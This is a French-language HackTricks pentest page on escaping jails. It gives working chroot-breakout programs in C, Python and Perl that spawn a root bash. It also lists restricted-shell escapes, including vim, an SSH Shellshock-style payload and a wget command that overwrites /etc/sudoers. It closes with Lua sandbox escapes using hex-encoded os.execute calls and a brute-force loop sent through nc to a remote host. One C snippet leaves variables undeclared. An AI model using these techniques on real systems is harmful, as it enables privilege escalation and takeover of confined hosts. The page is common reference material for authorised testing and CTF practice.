# Évasion des Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Recherchez sur** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **si vous pouvez exécuter un binaire avec la propriété "Shell"**

## Évasions Chroot

D'après [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations) : Le mécanisme chroot **n'est pas destiné à défendre** contre la manipulation intentionnelle par des **utilisateurs privilégiés** (**root**). Sur la plupart des systèmes, les contextes chroot ne s'empilent pas correctement et les programmes chrootés **avec des privilèges suffisants peuvent effectuer un second chroot pour s'échapper**.\
En général, cela signifie que pour s'échapper, vous devez être root à l'intérieur du chroot.

> [!TIP]
> L'**outil** [**chw00t**](https://github.com/earthquake/chw00t) a été créé pour abuser des scénarios suivants et s'échapper de `chroot`.

### Root + CWD

> [!WARNING]
> Si vous êtes **root** à l'intérieur d'un chroot, vous **pouvez vous échapper** en créant **un autre chroot**. Cela parce que 2 chroots ne peuvent pas coexister (dans Linux), donc si vous créez un dossier et ensuite **créez un nouveau chroot** dans ce nouveau dossier en étant **vous à l'extérieur**, vous serez maintenant **à l'extérieur du nouveau chroot** et donc vous serez dans le FS.
>
> Cela se produit parce que généralement chroot NE déplace PAS votre répertoire de travail vers celui indiqué, donc vous pouvez créer un chroot mais être à l'extérieur de celui-ci.

En général, vous ne trouverez pas le binaire `chroot` à l'intérieur d'une jail chroot, mais vous **pourriez compiler, télécharger et exécuter** un binaire :

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + fd sauvegardé

> [!WARNING]
> Cela est similaire au cas précédent, mais dans ce cas, l'**attaquant stocke un descripteur de fichier vers le répertoire courant** et ensuite **crée le chroot dans un nouveau dossier**. Enfin, comme il a **accès** à ce **FD** **en dehors** du chroot, il y accède et il **s'échappe**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD peut être passé par des Unix Domain Sockets, donc :
>
> - Créer un processus enfant (fork)
> - Créer UDS pour que le parent et l'enfant puissent communiquer
> - Exécuter chroot dans le processus enfant dans un dossier différent
> - Dans le processus parent, créer un FD d'un dossier qui est en dehors du chroot du nouveau processus enfant
> - Passer à l'enfant ce FD en utilisant l'UDS
> - Le processus enfant chdir vers ce FD, et parce qu'il est en dehors de son chroot, il s'échappera de la prison

### Root + Mount

> [!WARNING]
>
> - Monter le périphérique racine (/) dans un répertoire à l'intérieur du chroot
> - Chroot dans ce répertoire
>
> Cela est possible sous Linux

### Root + /proc

> [!WARNING]
>
> - Monter procfs dans un répertoire à l'intérieur du chroot (si ce n'est pas déjà fait)
> - Chercher un pid qui a une entrée root/cwd différente, comme : /proc/1/root
> - Chroot dans cette entrée

### Root(?) + Fork

> [!WARNING]
>
> - Créer un Fork (processus enfant) et chroot dans un dossier différent plus profondément dans le FS et CD dessus
> - Depuis le processus parent, déplacer le dossier où se trouve le processus enfant dans un dossier précédent au chroot des enfants
> - Ce processus enfant se retrouvera en dehors du chroot

### ptrace

> [!WARNING]
>
> - Il y a longtemps, les utilisateurs pouvaient déboguer leurs propres processus depuis un processus d'eux-mêmes... mais cela n'est plus possible par défaut
> - Quoi qu'il en soit, si c'est possible, vous pourriez ptrace dans un processus et exécuter un shellcode à l'intérieur ([voir cet exemple](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Obtenez des informations sur la prison :
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Modifier PATH

Vérifiez si vous pouvez modifier la variable d'environnement PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Utiliser vim
```bash
:set shell=/bin/sh
:shell
```
### Créer un script

Vérifiez si vous pouvez créer un fichier exécutable avec _/bin/bash_ comme contenu
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Obtenir bash depuis SSH

Si vous accédez via ssh, vous pouvez utiliser cette astuce pour exécuter un shell bash :
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Déclarer
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Vous pouvez écraser par exemple le fichier sudoers.
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Autres astuces

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**Il pourrait également être intéressant de consulter la page :**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python Jails

Astuces sur l'évasion des jails python dans la page suivante :

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Dans cette page, vous pouvez trouver les fonctions globales auxquelles vous avez accès à l'intérieur de lua : [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval avec exécution de commande :**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Quelques astuces pour **appeler des fonctions d'une bibliothèque sans utiliser de points** :
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Énumérer les fonctions d'une bibliothèque :
```bash
for k,v in pairs(string) do print(k,v) end
```
Notez que chaque fois que vous exécutez la ligne de commande précédente dans un **environnement lua différent, l'ordre des fonctions change**. Par conséquent, si vous devez exécuter une fonction spécifique, vous pouvez effectuer une attaque par force brute en chargeant différents environnements lua et en appelant la première fonction de la bibliothèque :
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Obtenir un shell lua interactif** : Si vous êtes à l'intérieur d'un shell lua limité, vous pouvez obtenir un nouveau shell lua (et espérons-le illimité) en appelant :
```bash
debug.debug()
```
## Références

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Diapositives : [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))

{{#include ../../banners/hacktricks-training.md}}
